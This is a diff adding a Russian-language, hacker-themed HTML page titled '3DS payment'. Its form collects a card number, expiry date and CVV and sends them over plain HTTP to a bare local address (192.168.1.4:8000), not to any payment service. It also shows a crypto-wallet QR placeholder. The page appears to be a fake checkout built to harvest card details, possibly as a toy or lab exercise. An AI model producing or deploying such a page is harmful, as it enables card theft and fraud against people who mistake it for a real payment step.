@@ -1,0 +1,188 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Оплата 3DS</title>
+    <style>
+        body {
+            margin: 0;
+            min-height: 100vh; /* Изменено на min-height для прокрутки */
+            display: flex;
+            flex-direction: column; /* Изменено для вертикальной компоновки */
+            justify-content: center;
+            align-items: center;
+            background-color: #000;
+            overflow: auto; /* Изменено на auto для прокрутки */
+            position: relative;
+            font-family: 'Courier New', Courier, monospace;
+        }
+
+        .background {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: linear-gradient(0deg, rgba(0, 255, 255, 0.1) 0%, rgba(0, 0, 0, 0.8) 100%);
+            overflow: hidden;
+        }
+
+        .grid {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background-image: url('data:image/svg+xml;utf8,<svg xmlns="http://www.w3.org/2000/svg" width="100" height="100" viewBox="0 0 100 100" fill="none"><path d="M0 0h100v100H0z" fill="none"/><path d="M0 0h100v1H0zM0 10h100v1H0zM0 20h100v1H0zM0 30h100v1H0zM0 40h100v1H0zM0 50h100v1H0zM0 60h100v1H0zM0 70h100v1H0zM0 80h100v1H0zM0 90h100v1H0z" fill="cyan" opacity="0.1"/></svg>');
+            background-size: 100px 100px;
+            animation: move 10s linear infinite;
+        }
+
+        @keyframes move {
+            0% { background-position: 0 0; }
+            100% { background-position: 0 100px; }
+        }
+
+        .form-container {
+            position: relative;
+            z-index: 1;
+            background-color: rgba(0, 0, 0, 0.7);
+            padding: 15px; /* Уменьшены отступы */
+            border-radius: 10px;
+            box-shadow: 0 0 20px rgba(0, 255, 255, 0.5);
+            width: 90%;
+            max-width: 300px; /* Уменьшена максимальная ширина */
+        }
+
+        h1 {
+            color: #00ffff;
+            text-align: center;
+            margin-bottom: 15px; /* Уменьшено расстояние */
+        }
+
+        label {
+            color: #00ffff;
+            display: block;
+            margin-bottom: 5px; /* Уменьшено расстояние */
+        }
+
+        input[type="text"], input[type="number"], input[type="submit"] {
+            width: 100%;
+            padding: 8px; /* Уменьшены отступы */
+            margin-bottom: 15px; /* Уменьшено расстояние */
+            border: 2px solid #00ffff;
+            border-radius: 5px;
+            background-color: rgba(0, 0, 0, 0.5);
+            color: #00ffff;
+        }
+
+        input[type="submit"] {
+            background-color: #00ffff;
+            color: #000;
+            font-size: 16px;
+            cursor: pointer;
+            transition: background-color 0.3s;
+        }
+
+        input[type="submit"]:hover {
+            background-color: #00cccc;
+        }
+
+        .hacker-text {
+            position: absolute;
+            color: rgba(0, 255, 255, 0.5);
+            font-size: 20px;
+            white-space: nowrap;
+            animation: moveUp 10s linear infinite;
+            bottom: -50px;
+                }
+
+        @keyframes moveUp {
+            0% { transform: translateY(100vh); }
+            100% { transform: translateY(-100%); }
+        }
+
+        /* Разные позиции для хакерских надписей */
+        .text1 { left: 5%; animation-delay: 0s; }
+        .text2 { left: 30%; animation-delay: 1s; }
+        .text3 { left: 55%; animation-delay: 2s; }
+        .text4 { left: 10%; animation-delay: 3s; }
+        .text5 { left: 40%; animation-delay: 4s; }
+        .text6 { left: 70%; animation-delay: 5s; }
+        .text7 { left: 20%; animation-delay: 6s; }
+        .text8 { left: 80%; animation-delay: 7s; }
+        .text9 { left: 15%; animation-delay: 8s; }
+        .text10 { left: 50%; animation-delay: 9s; }
+
+        .neon-text {
+            position: absolute;
+            top: 20px; /* Положение сверху */
+            color: #ff6600; /* Неоновый оранжевый цвет */
+            font-size: 60px; /* Размер текста */
+            text-shadow: 
+                0 0 5px #ff6600,
+                0 0 10px #ff6600,
+                0 0 15px #ff3300,
+                0 0 20px #ff3300,
+                0 0 30px #ff3300,
+                0 0 40px #ff3300,
+                0 0 50px #ff3300;
+            font-family: 'Courier New', Courier, monospace;
+            white-space: nowrap;
+            z-index: 2; /* Убедитесь, что текст поверх других элементов */
+        }
+
+        .qr-code {
+            text-align: center;
+            margin-top: 20px;
+        }
+
+        .wallet-address {
+            color: #00ffff;
+            text-align: center;
+            margin-top: 10px;
+            font-family: 'Courier New', Courier, monospace;
+        }
+    </style>
+</head>
+<body>
+    <div class="background">
+        <div class="grid"></div>
+    </div>
+
+    <div class="neon-text"></div> <!-- Неоновая надпись OASIS -->
+
+    <div class="form-container">
+        <form action="http://192.168.1.4:8000/">
+            <label for="card-number">Номер карты:</label>
+            <input type="text" id="card-number" name="card-number" required placeholder="XXXX-XXXX-XXXX-XXXX">
+            
+            <label for="expiry-date">Дата (ММ/ГГ):</label>
+            <input type="text" id="expiry-date" name="expiry-date" required placeholder="MM/YY">
+            
+            <label for="cvv">CVV код:</label>
+            <input type="number" id="cvv" name="cvv" required placeholder="XXX" maxlength="3">
+            
+            <input type="submit" value="Оплатить">
+        </form>
+
+        <div class="qr-code">
+            <h2>Оплата криптовалютой</h2>
+            <img src="https://api.qrserver.com/v1/create-qr-code/?data=YOUR_CRYPTO_WALLET_ADDRESS&size=150x150" alt="QR Code">
+            <div class="wallet-address">Адрес крипто-кошелька:</div>
+        </div>
+    </div>
+
+    <div class="hacker-text text1">HACKER ZONE</div>
+    <div class="hacker-text text2">ACCESS GRANTED</div>
+    <div class="hacker-text text3">SYSTEM FAILURE</div>
+    <div class="hacker-text text4">LOADING...</div>
+    <div class="hacker-text text5">ENCRYPTING DATA</div>
+    <div class="hacker-text text6">CONNECTION ESTABLISHED</div>
+    <div class="hacker-text text7">DATA BREACH DETECTED</div>
+    <div class="hacker-text text8">SECURITY OVERRIDE</div>
+    <div class="hacker-text text9">INTRUSION ALERT</div>
+    <div class="hacker-text text10">SYSTEM HACKED</div>
+</body>
+</html>
